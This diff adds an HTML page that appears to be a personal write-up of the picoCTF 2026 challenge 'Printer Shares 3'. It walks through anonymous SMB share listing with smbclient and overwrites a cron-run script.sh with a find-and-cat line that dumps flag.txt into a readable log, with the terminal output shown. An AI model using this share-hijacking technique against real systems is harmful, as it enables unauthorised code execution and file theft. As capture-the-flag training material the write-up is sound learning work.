@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>picoCTF Printer Shares 3 @ Shukularuni</title>
+    <link rel="stylesheet" href="/style.css">
+    <link rel="icon" type="image/x-icon" href="/icon.png">
+</head>
+<body>
+    <header>
+        <h1>picoCTF General Skills Guide</h1>
+        <p>here's how to solve Printer Shares 3</p>
+    </header>
+    <main>
+        <section>
+            <a href="./">Back to the General Skills Guides</a>
+            <hr>
+            <h2>Printer Shares 3</h2>
+            <pre>Name: Printer Shares 3
+Description: I accidentally left the debug script in place… Well, I think that's fine - No one could possibly access my super secure directory two printers are on 53695, one private, one public. you can try $ nc -vz dolphin-cove.picoctf.net 53695
+Author: Janice He
+Tags: Hard, General Skills, picoCTF 2026
+Challenge from: picoCTF 2026
+Hints:
+1. a suspicious script is running every minute
+2. this script runs every minute, you might need to wait for a while</pre>
+            <h2>Theory</h2>
+            <p>According to the description, to get the flag we need to connect to a printer and get a file that the printer holds. We are given a NetCat command that will check if the printer on the port is up and running, but it'll actually not give us any extra info, instead to view files from the printer we'll have to look at the users the printer has, it should be named something like disk or share since shares is the codename for users on this environment, so we can get access to the files of the printer. So to search the actual users we need a command like this, using smbclient with the option -L to list the shares on the port the printer is in, and use the -N option so that it doesn't ask for our password each time we do this command:</p>
+            <pre>smbclient -L dolphin-cove.picoctf.net -p 53695 -N</pre>
+            <h2>Solution</h2>
+            <p>We can check the printer is alive and then the usual command from theory, and also check whatever files are on the public printer share:</p>
+            <pre>shukularuni@SHUKULAP:~$ smbclient -L dolphin-cove.picoctf.net -p 53695 -N
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        shares          Disk      Public Share With Guests
+        secure-shares   Disk      Printer for internal usage only
+        IPC$            IPC       IPC Service (Samba 4.19.5-Ubuntu)
+SMB1 disabled -- no workgroup available
+
+shukularuni@SHUKULAP:~$ smbclient //dolphin-cove.picoctf.net/shares -p 53695 -N
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Wed Apr  8 10:21:01 2026
+  ..                                  D        0  Wed Apr  8 10:21:01 2026
+  script.sh                           N       73  Wed Feb  4 21:22:17 2026
+  cron.log                            N       86  Wed Apr  8 10:22:01 2026
+
+        65536 blocks of size 1024. 57340 blocks available
+
+smb: \&gt; get script.sh
+getting file \script.sh of size 73 as script.sh (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+
+smb: \&gt; get cron.log
+getting file \cron.log of size 86 as cron.log (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
+
+smb: \&gt; exit
+
+shukularuni@SHUKULAP:~$ cat cron.log script.sh
+Health Check: Wed Apr  8 09:21:01 UTC 2026
+Health Check: Wed Apr  8 09:22:01 UTC 2026
+
+#!/bin/bash
+# this script runs every minute
+echo "Health Check: $(date)"</pre>
+            <p>So it seems there's a script that runs each minute as a "health check", I think the exploit here might be the fact that we can edit this script by creating a file of the same name and replacing it on the printer share. So if we want to find the flag we can use the usual find command to search through the entire system and then get the content of any file where its name is flag.txt, and then print that into the cron.log file:</p>
+            <pre>#!/bin/bash
+# Find the flag file and append its content to the log
+find / -name "flag.txt" 2>/dev/null -exec cat {} \; &gt;&gt; /challenge/shares/cron.log 2>&1</pre>
+            <p>Now that we have the script made, we can put it in a file named exactly script.sh so that the script gets replaced with our script and runs ours instead, then wait a minute or so and check the cron.log file, and see if the script was successful in getting the flag:</p>
+            <pre>shukularuni@SHUKULAP:~$ nano script.sh
+
+shukularuni@SHUKULAP:~$ smbclient //dolphin-cove.picoctf.net/shares -p 53695 -N
+Try "help" to get a list of possible commands.
+smb: \&gt; put script.sh
+putting file script.sh as \script.sh (0.4 kb/s) (average 0.4 kb/s)
+
+smb: \&gt; more cron.log
+Health Check: Wed Apr  8 09:21:01 UTC 2026
+Health Check: Wed Apr  8 09:22:01 UTC 2026
+Health Check: Wed Apr  8 09:23:01 UTC 2026
+Health Check: Wed Apr  8 09:24:01 UTC 2026
+Health Check: Wed Apr  8 09:25:01 UTC 2026
+Health Check: Wed Apr  8 09:26:02 UTC 2026
+find: '/etc/credstore': Permission denied
+find: '/etc/credstore.encrypted': Permission denied
+...
+find: '/var/log/cores': Permission denied
+find: '/var/log/private': Permission denied
+find: '/var/spool/cron/crontabs': Permission denied
+picoCTF{5mb_pr1nter_5h4re5_r3v3r53_b68ad4a8}
+(END)</pre>
+            <p>There we go! That's the flag.</p>
+            <p>I rated this level as "good"! :3</p>
+            <hr>
+            <a target="_blank" href="https://play.picoctf.org/practice/challenge/741">https://play.picoctf.org/practice/challenge/741</a>
+        </section>
+        <section class="link-list">
+            <h2>Explore My Website</h2>
+            <ul>
+                <li><a href="/">Home</a></li>
+                <li><a href="/search.html">Search</a></li>
+                <li><a href="/articles.html">Articles</a></li>
+                <li><a href="/guides.html">Guides</a></li>
+            </ul>
+            <br><br><br>
+        </section>
+    </main>
+    <footer>
+        <p class="cute">Made with ❤️ by Shukularuni</p>
+    </footer>
+</body>
+</html>
